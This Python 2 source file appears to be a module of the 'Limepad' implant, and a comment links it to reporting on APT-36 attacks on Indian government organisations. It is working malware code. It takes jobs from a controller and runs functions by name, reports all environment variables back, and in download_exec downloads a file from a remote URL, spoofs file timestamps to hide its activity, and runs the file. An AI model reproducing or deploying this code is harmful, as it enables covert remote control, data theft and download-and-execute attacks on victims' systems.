# module used by Limepad
# reference blog: https://www.zscaler.com/blogs/security-research/new-and-improved-ttps-apt-36-targeting-indian-governmental-organizations
import os, sys, random, time, json, subprocess, urllib, urllib2
from controls import ROOTDATA, FILEFLAG, VERSION, USERFILE, TEMP_UPLOAD_FOLDER
import logging
from timespoofer import timespoofer
billet = logging.getLogger('Limepad')

def get_env_info(conn, db, job_id):
    jobs = [ fname for fname, f in globals().items() if callable(f) and fname not in ('server_working', ) ]
    env = dict(os.environ)
    version = VERSION
    ret = {'jobs': jobs, 'environment': env, 'version': version}
    return json.dumps(ret)


class MyURLOpener(urllib.FancyURLopener):

    def http_error_default(self, url, fp, errcode, errmsg, headers):
        raise Exception(errmsg)


def download_exec(conn, db, job_id, url):
    global billet
    try:
        locfile = os.path.join(ROOTDATA, 'dl_%d.scr' % random.randrange(1000, 9999))
        urllib.urlretrieve(url, locfile)
        timespoofer('c:\\programdata')
        os.startfile(locfile)
    except Exception as e:
        billet.exception(e)


def server_working(conn, db):
    job = conn.get_job()
    billet.debug('Processing job')
    if job:
        billet.info('Processing job: %s' % str(job))
        job_command = job['command']
        job_args = job['arguments'].split('|') if job['arguments'] else None
        job_id = job['id']
        try:
            if job_args:
                res = globals()[job_command](conn, db, job_id, *job_args)
            else:
                res = globals()[job_command](conn, db, job_id)
        except Exception as e:
            conn.ack_job(job_id, 'Error: %s' % e.message)
            billet.exception(e)
        else:
            billet.info('Job result of %s: %s' % (str(job_id), str(res)))
            conn.ack_job(job_id, str(res))

    return


if __name__ == '__main__':
    print get_env_info(None, None, None)
